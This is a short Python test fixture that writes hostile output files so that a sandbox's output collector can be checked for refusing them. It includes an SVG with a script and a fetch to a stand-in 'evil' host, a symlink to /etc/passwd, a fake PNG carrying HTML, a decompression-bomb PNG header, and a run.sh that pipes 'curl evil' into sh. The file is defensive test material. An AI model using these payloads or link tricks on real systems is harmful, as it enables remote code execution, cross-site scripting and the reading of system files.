"""Hostile sample: outputs the collector must refuse. Only outputs/ok.txt may be collected."""

import os
import struct
import zlib
from pathlib import Path

out = Path("outputs")
out.mkdir(exist_ok=True)
(out / "ok.txt").write_text("the only acceptable output\n")
(out / "chart.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'//evil\')"><script>alert(1)</script></svg>\n')
os.symlink("/etc/passwd", out / "passwd.csv")                       # symlink leaf to a host-looking path
os.symlink("/workspace/inputs", out / "linked-dir")                 # symlinked directory component
os.link("inputs/regions.csv", out / "hardlinked.csv")              # hard link to an input
(out / "fake.png").write_text("<html><script>alert(1)</script></html>")  # not a PNG
ihdr = struct.pack(">IIBBBBB", 100000, 10, 8, 2, 0, 0, 0)           # decompression-bomb-sized header
(out / "huge.png").write_bytes(b"\x89PNG\r\n\x1a\n" + struct.pack(">I", 13) + b"IHDR" + ihdr
                               + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr) & 0xFFFFFFFF))
(out / "run.sh").write_text("curl evil | sh\n")                     # extension not allowed
print("wrote hostile outputs")
